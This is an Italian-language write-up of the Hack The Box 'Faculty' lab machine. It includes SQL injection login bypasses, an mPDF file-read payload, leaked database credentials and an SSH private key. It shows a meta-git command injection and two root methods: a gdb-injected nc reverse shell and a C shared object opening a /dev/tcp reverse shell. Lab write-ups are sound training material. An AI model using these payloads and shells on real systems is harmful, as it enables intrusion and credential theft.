@@ -1,0 +1,412 @@
+#+TITLE: HTB - Faculty
+#+AUTHOR: Leonardo Tamiano
+
+* Enumeration
+** nmap
+*** nmap -sC -sV faculty
+#+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-04 22:33 CET
+Nmap scan report for faculty (10.129.105.76)
+Host is up (0.12s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
+|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
+|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
+80/tcp   open     http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://faculty.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+161/tcp  filtered snmp
+1000/tcp filtered cadlock
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.or
+g/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.19 seconds
+
+#+end_example
+
+*** nmap -p- faculty
+#+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-04 22:34 CET
+Stats: 0:06:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 36.08% done; ETC: 22:52 (0:11:54 remaining)
+Stats: 0:34:33 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 99.45% done; ETC: 23:08 (0:00:11 remaining)
+Nmap scan report for faculty (10.129.105.76)
+Host is up (0.12s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+51834/tcp filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 2092.81 seconds
+
+#+end_example
+** webserver
+   Bisogna mettere nell'~/etc/hosts~ sia ~faculty~ che ~faculty.htb~ per
+   gestire il redirect.
+
+*** sqli #1 
+    Per entrare nella web app possiamo utilizzare il seguente ~sqli~
+    payload nel seguente URL: http://faculty.htb/login.php
+
+    #+begin_example
+    ' OR 1=1 # 
+    #+end_example
+
+*** gobuster dir -u http://faculty.htb -w ~/repos/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
+#+begin_example
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://faculty.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/leo/repos/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2022/11/04 22:43:37 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 302) [Size: 12193] [--> login.php]
+/login.php            (Status: 200) [Size: 4860]                 
+/header.php           (Status: 200) [Size: 2871]                 
+/admin                (Status: 301) [Size: 178] [--> http://faculty.htb/admin/]
+/test.php             (Status: 500) [Size: 0]                                  
+Progress: 8230 / 441122 (1.87%)                                               ^C
+[!] Keyboard interrupt detected, terminating.
+                                                                               
+===============================================================
+2022/11/04 22:45:20 Finished
+===============================================================
+
+#+end_example
+
+*** sqli #2 
+    Un'altra sql injection permette di bypassare il login per accere
+    alla webapp da admin. Il payload deve essere inserito nel campo
+    ~username~ nel seguente URL: http://faculty.htb/admin/login.php
+
+    #+begin_example
+    ' OR 1=1 # 
+    #+end_example
+
+*** generazione di pdf
+    Per generare il pdf contenente i dati nella tabella viene
+    utilizzata la libreria ~mPDF~ https://mpdf.github.io/.
+
+    Tale generazione avviene effettuando una ~POST~ all'endpoint
+    ~/admin/download.php~
+
+    #+begin_example
+    POST /admin/download.php HTTP/1.1
+Host: faculty.htb
+Content-Length: 2184
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://faculty.htb
+Referer: http://faculty.htb/admin/index.php?page=courses
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=84tkqmv598714up6gh5r2qgkl6
+Connection: close
+
+pdf=JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VDb3Vyc2VzJTI1M0MlMjUyRmgyJTI1M0UlMjUzQ3RhYmxlJTI1M0UlMjUwOSUyNTNDdGhlYWQlMjUzRSUyNTA5JTI1MDklMjUzQ3RyJTI1M0UlMjUwOSUyNTA5JTI1MDklMjUzQ3RoJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1MjMlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VDb3Vyc2UlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VEZXNjcmlwdGlvbiUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0MlMjUyRnRyJTI1M0UlMjUzQyUyNTJGdGhlYWQlMjUzRSUyNTNDdGJvZHklMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UxJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VOVU9WTyUyQk5PTUUlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VCYWNoZWxvciUyQm9mJTJCU2NpZW5jZSUyQmluJTJCQ29tcHV0ZXIlMkJTY2llbmNlc3NzJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UyJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VCU0lTJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFQmFjaGVsb3IlMkJvZiUyQlNjaWVuY2UlMkJpbiUyQkluZm9ybWF0aW9uJTJCU3lzdGVtcyUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFMyUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFQlNFRCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRUJhY2hlbG9yJTJCaW4lMkJTZWNvbmRhcnklMkJFZHVjYXRpb24lMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnNtYWxsJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0MlMjUyRnRib2J5JTI1M0UlMjUzQyUyNTJGdGFibGUlMjUzRQ==
+    #+end_example
+
+    Il valore messo come parametro ~pdf=...~ è ottenuto partendo
+    dall'html ed effetuando i seguenti steps di codifica
+    
+    #+begin_example
+    html -> url encoding -> url encoding -> base64 encoding
+    #+end_example
+
+    Per tornare indietro devo quindi procedere in verso opposto
+
+    #+begin_example
+    valore -> base64 decoding -> url decoding -> url decoding -> html
+    #+end_example
+*** LFI tramite mPDF
+    Utilizzando il tag ~annotation~ offerto dalla libreria mpdf siamo in
+    grado di leggere file nel server remoto, ammesso di sapere il path
+    del file.
+
+    Per ottenere questa LFI procediamo come segue:
+
+    1. Scrivere il payload html con la annotation tag
+       
+       #+begin_src html
+<annotation file="/etc/passwd" content="prova" pos-x="195"/>
+<h1> <a name="top"></a>faculty.htb</h1>       
+       #+end_src
+
+    2. Effettuare il processo di codifica
+       
+       #+begin_example
+       url -> url -> base64
+       #+end_example
+       
+       #+begin_example
+JTI1JTMzJTYzJTI1JTM2JTMxJTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTY2JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMyJTMwJTI1JTM2JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTM2JTM1JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM3JTMwJTI1JTM3JTMyJTI1JTM2JTY2JTI1JTM3JTM2JTI1JTM2JTMxJTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTMwJTI1JTM2JTY2JTI1JTM3JTMzJTI1JTMyJTY0JTI1JTM3JTM4JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMzJTMxJTI1JTMzJTM5JTI1JTMzJTM1JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTMzJTY1JTI1JTMwJTYxJTI1JTMzJTYzJTI1JTM2JTM4JTI1JTMzJTMxJTI1JTMzJTY1JTI1JTMyJTMwJTI1JTMzJTYzJTI1JTM2JTMxJTI1JTMyJTMwJTI1JTM2JTY1JTI1JTM2JTMxJTI1JTM2JTY0JTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM3JTM0JTI1JTM2JTY2JTI1JTM3JTMwJTI1JTMyJTMyJTI1JTMzJTY1JTI1JTMzJTYzJTI1JTMyJTY2JTI1JTM2JTMxJTI1JTMzJTY1JTI1JTM2JTM2JTI1JTM2JTMxJTI1JTM2JTMzJTI1JTM3JTM1JTI1JTM2JTYzJTI1JTM3JTM0JTI1JTM3JTM5JTI1JTMyJTY1JTI1JTM2JTM4JTI1JTM3JTM0JTI1JTM2JTMyJTI1JTMzJTYzJTI1JTMyJTY2JTI1JTM2JTM4JTI1JTMzJTMxJTI1JTMzJTY1JTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMw       
+       #+end_example
+
+    3. Inviare una POST all'endpoint ~/admin/download.php~
+       
+       #+begin_example
+POST /admin/download.php HTTP/1.1
+Host: faculty.htb
+Content-Length: 6256
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://faculty.htb
+Referer: http://faculty.htb/admin/index.php?page=courses
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=84tkqmv598714up6gh5r2qgkl6
+Connection: close
+
+pdf=JTI1JTMzJTYzJTI1JTM2JTMxJTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTY2JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMyJTMwJTI1JTM2JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTM2JTM1JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM3JTMwJTI1JTM3JTMyJTI1JTM2JTY2JTI1JTM3JTM2JTI1JTM2JTMxJTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTMwJTI1JTM2JTY2JTI1JTM3JTMzJTI1JTMyJTY0JTI1JTM3JTM4JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMzJTMxJTI1JTMzJTM5JTI1JTMzJTM1JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTMzJTY1JTI1JTMwJTYxJTI1JTMzJTYzJTI1JTM2JTM4JTI1JTMzJTMxJTI1JTMzJTY1JTI1JTMyJTMwJTI1JTMzJTYzJTI1JTM2JTMxJTI1JTMyJTMwJTI1JTM2JTY1JTI1JTM2JTMxJTI1JTM2JTY0JTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM3JTM0JTI1JTM2JTY2JTI1JTM3JTMwJTI1JTMyJTMyJTI1JTMzJTY1JTI1JTMzJTYzJTI1JTMyJTY2JTI1JTM2JTMxJTI1JTMzJTY1JTI1JTM2JTM2JTI1JTM2JTMxJTI1JTM2JTMzJTI1JTM3JTM1JTI1JTM2JTYzJTI1JTM3JTM0JTI1JTM3JTM5JTI1JTMyJTY1JTI1JTM2JTM4JTI1JTM3JTM0JTI1JTM2JTMyJTI1JTMzJTYzJTI1JTMyJTY2JTI1JTM2JTM4JTI1JTMzJTMxJTI1JTMzJTY1JTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMwJTI1JTMyJTMw       
+       #+end_example
+
+    4. Leggere la risposta dal server
+       
+       #+begin_example
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Fri, 04 Nov 2022 22:11:34 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Content-Length: 47
+
+OKxZcOBYAUwt8QdF9oD4RfK6J0.pdf                       
+       #+end_example
+
+    5. Scaricare il pdf generato tramite firefox e leggere il file
+       embeddato guardando sugli attachments.
+       
+       #+begin_example
+       http://faculty.htb/mpdf/tmp/OKxZcOBYAUwt8QdF9oD4RfK6J0.pdf
+       #+end_example
+
+*** Utilizzare la LFI per il foothold
+
+  Possiamo utilizzare la LFI per ottenere i seguenti file
+
+  - [X] index.php
+  - [X] login.php
+  - [X] db_connect.php
+  - [ ] download.php
+
+  Alla fine in ~db_connect.php~ troviamo il seguente codice
+  
+  #+begin_src php  
+$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
+  #+end_src
+
+  e utilizzando la password ~Co.met06aci.dly53ro.per~ con l'utente
+  ~gbyolo~ possiamo connetterci in ssh
+  
+  #+begin_example
+gbyolo:Co.met06aci.dly53ro.per  
+  #+end_example
+
+* PrivEsc
+
+** credenziali
+   #+begin_example
+gbyolo:Co.met06aci.dly53ro.per     
+   #+end_example
+
+** as gbyolo
+*** sudo -l
+    #+begin_example
+gbyolo@faculty:/home$ sudo -l
+[sudo] password for gbyolo: 
+Matching Defaults entries for gbyolo on faculty:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User gbyolo may run the following commands on faculty:
+    (developer) /usr/local/bin/meta-git    
+    #+end_example
+
+*** meta-git to get developer code exec
+    Tramite un ~bug~ di meta-git
+
+    #+begin_example
+gbyolo@faculty:/tmp$ sudo -u developer /usr/local/bin/meta-git clone 'sss||cat /home/developer/.ssh/id_rsa'
+meta git cloning into 'sss||cat /home/developer/.ssh/id_rsa' at id_rsa
+
+id_rsa:
+fatal: destination path 'sss' already exists and is not an empty directory.
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329//sdapn4ncVzRYZxACC/czxmSO5Us2S87dxyw
+izZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp/zBy0pVK6H7g6GMAVS
+pribX/DrdHCcmsIu7WqkyZ0mDN2sS+3uMk6I3361x2ztAG1aC9xJX7EJsHmXDRLZ8G1Rib
+KpI0WqAWNSXHDDvcwDpmWDk+NlIRKkpGcVByzhG8x1azvKWS9G36zeLLARBP43ax4eAVrs
+Ad+7ig3vl9Iv+ZtRzkH0PsMhriIlHBNUy9dFAGP5aa4ZUkYHi1/MlBnsWOgiRHMgcJzcWX
+OGeIJbtcdp2aBOjZlGJ+G6uLWrxwlX9anM3gPXTT4DGqZV1Qp/3+JZF19/KXJ1dr0i328j
+saMlzDijF5bZjpAOcLxS0V84t99R/7bRbLdFxME/0xyb6QMKcMDnLrDUmdhiObROZFl3v5
+hnsW9CoFLiKE/4jWKP6lPU+31GOTpKtLXYMDbcepAAAFiOUui47lLouOAAAAB3NzaC1yc2
+EAAAGBAMQwIKx3A9iOFN9vf/7HWqZ+J3Fc0WGcQAgv3M8ZkjuVLNkvO3ccsIs2dIQ7Mx8p
+PmwgeQdcL67ZgBbtijeGhgqACTDRplaHAZyJEnMxqf8wctKVSuh+4OhjAFUqa4m1/w63Rw
+nJrCLu1qpMmdJgzdrEvt7jJOiN9+tcds7QBtWgvcSV+xCbB5lw0S2fBtUYmyqSNFqgFjUl
+xww73MA6Zlg5PjZSESpKRnFQcs4RvMdWs7ylkvRt+s3iywEQT+N2seHgFa7AHfu4oN75fS
+L/mbUc5B9D7DIa4iJRwTVMvXRQBj+WmuGVJGB4tfzJQZ7FjoIkRzIHCc3FlzhniCW7XHad
+mgTo2ZRifhuri1q8cJV/WpzN4D100+AxqmVdUKf9/iWRdffylydXa9It9vI7GjJcw4oxeW
+2Y6QDnC8UtFfOLffUf+20Wy3RcTBP9Mcm+kDCnDA5y6w1JnYYjm0TmRZd7+YZ7FvQqBS4i
+hP+I1ij+pT1Pt9Rjk6SrS12DA23HqQAAAAMBAAEAAAGBAIjXSPMC0Jvr/oMaspxzULdwpv
+JbW3BKHB+Zwtpxa55DntSeLUwXpsxzXzIcWLwTeIbS35hSpK/A5acYaJ/yJOyOAdsbYHpa
+ELWupj/TFE/66xwXJfilBxsQctr0i62yVAVfsR0Sng5/qRt/8orbGrrNIJU2uje7ToHMLN
+J0J1A6niLQuh4LBHHyTvUTRyC72P8Im5varaLEhuHxnzg1g81loA8jjvWAeUHwayNxG8uu
+ng+nLalwTM/usMo9Jnvx/UeoKnKQ4r5AunVeM7QQTdEZtwMk2G4vOZ9ODQztJO7aCDCiEv
+Hx9U9A6HNyDEMfCebfsJ9voa6i+rphRzK9or/+IbjH3JlnQOZw8JRC1RpI/uTECivtmkp4
+ZrFF5YAo9ie7ctB2JIujPGXlv/F8Ue9FGN6W4XW7b+HfnG5VjCKYKyrqk/yxMmg6w2Y5P5
+N/NvWYyoIZPQgXKUlTzYj984plSl2+k9Tca27aahZOSLUceZqq71aXyfKPGWoITp5dAQAA
+AMEAl5stT0pZ0iZLcYi+b/7ZAiGTQwWYS0p4Glxm204DedrOD4c/Aw7YZFZLYDlL2KUk6o
+0M2X9joquMFMHUoXB7DATWknBS7xQcCfXH8HNuKSN385TCX/QWNfWVnuIhl687Dqi2bvBt
+pMMKNYMMYDErB1dpYZmh8mcMZgHN3lAK06Xdz57eQQt0oGq6btFdbdVDmwm+LuTRwxJSCs
+Qtc2vyQOEaOpEad9RvTiMNiAKy1AnlViyoXAW49gIeK1ay7z3jAAAAwQDxEUTmwvt+oX1o
+1U/ZPaHkmi/VKlO3jxABwPRkFCjyDt6AMQ8K9kCn1ZnTLy+J1M+tm1LOxwkY3T5oJi/yLt
+ercex4AFaAjZD7sjX9vDqX8atR8M1VXOy3aQ0HGYG2FF7vEFwYdNPfGqFLxLvAczzXHBud
+QzVDjJkn6+ANFdKKR3j3s9xnkb5j+U/jGzxvPGDpCiZz0I30KRtAzsBzT1ZQMEvKrchpmR
+jrzHFkgTUug0lsPE4ZLB0Re6Iq3ngtaNUAAADBANBXLol4lHhpWL30or8064fjhXGjhY4g
+blDouPQFIwCaRbSWLnKvKCwaPaZzocdHlr5wRXwRq8V1VPmsxX8O87y9Ro5guymsdPprXF
+LETXujOl8CFiHvMA1Zf6eriE1/Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVF
+YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
+9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ==
+-----END OPENSSH PRIVATE KEY-----
+cat: id_rsa: No such file or directory
+id_rsa: command 'git clone sss||cat /home/developer/.ssh/id_rsa id_rsa' exited with error: Error: Command failed: git clone sss||cat /home/de
+veloper/.ssh/id_rsa id_rsa
+(node:5112) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/tmp/id_rsa'
+    at process.chdir (internal/process/main_thread_only.js:31:12)
+    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
+    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
+    at process._tickCallback (internal/process/next_tick.js:68:7)
+    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
+    at startup (internal/bootstrap/node.js:283:19)
+    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
+(node:5112) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async functi
+on without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 2)
+(node:5112) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled
+ will terminate the Node.js process with a non-zero exit code.
+    
+    #+end_example
+
+** as developer
+*** getcap
+    #+begin_example
+developer@faculty:~$ getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_n
+/usr/bin/gdb = cap_sys_ptrace+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep    
+    #+end_example
+
+** per root
+*** approccio #1: gdb + python
+    L'idea è di attaccarsi ad un python script che esegue come root e
+    utilizzare la capability di gdb ~cap_sys_ptrace+ep~
+
+    I processi si vedono con ~ps aux~
+    
+    #+begin_example
+developer@faculty:~$ ps aux | grep python3
+root         703  0.0  0.9  26896 18072 ?        Ss   Nov04   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+develop+    6479  0.0  0.1   5192  2556 pts/0    S+   00:23   0:00 grep --color=auto python3    
+    #+end_example
+
+    Notiamo che il processo con PID ~703~ gira da root ed eseguire un
+    interprete python ~/usr/bin/python3~. Per debuggarlo con gdb
+    procediamo come segue
+    
+    #+begin_src sh
+developer@faculty:~$ gdb -p 703
+    #+end_src
+
+    #+begin_example
+(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so)
+0x00007f86d249cc3a in __GI___wait4 (pid=6252, stat_loc=stat_loc@entry=0x7fff32d80cf8, options=options@entry=0, usage=usage@entry=0x0)
+    at ../sysdeps/unix/sysv/linux/wait4.c:27
+27      ../sysdeps/unix/sysv/linux/wait4.c: No such file or directory.
+(gdb) call system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 127.0.0.1 4321 >/tmp/f ")    
+    #+end_example
+
+    e mettendomi in ascolto su un'altra shell locale alla porta 4321
+    ottengo una revshell da root.
+
+*** approccio #2: share object loading
+    Creiamo un shared object
+
+    #+begin_src c
+#include <pthread.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define SLEEP 120
+#define ADDR "127.0.0.1"
+#define PORT "4444"
+
+#define CMD "echo 'exec >&/dev/tcp/"\
+  ADDR "/" PORT "; exec 0>&1' | /bin/bash"
+
+void *callback(void *a);
+
+__attribute__((constructor)) void start_callback() {
+  pthread_t tid;
+  pthread_attr_t attr;
+
+  if (-1 == pthread_attr_init(&attr)) {
+    return;
+  }
+
+  if (-1 == pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED)) {
+    return;
+  }
+
+  pthread_create(&tid, &attr, callback, NULL);  
+}
+
+void *callback(void *a) {
+  for (;;) {
+    system(CMD);
+    sleep(SLEEP);
+  }
+  return NULL;
+}    
+    #+end_src
+    
+    e lo compiliamo in un ~.so~ (shared object)
+    
+    #+begin_src sh
+gcc -fPIC -o libcallback.so callback.c -lpthread -shared
+    #+end_src
+
+    trasferiamo il file libcallback.so nella macchina remota, e da gdb
+    ci colleghiamo sempre al processo 703 ed inviaimo il seguente
+    comando
+    
+    #+begin_example
+(gdb) print __libc_dlopen_mode("/home/developer/libcallback.so", 2)
+    #+end_example
+
+* Flags
+  - *user*: 8d5134c31caf36d561f86bf543e80730
+  - *root*: 
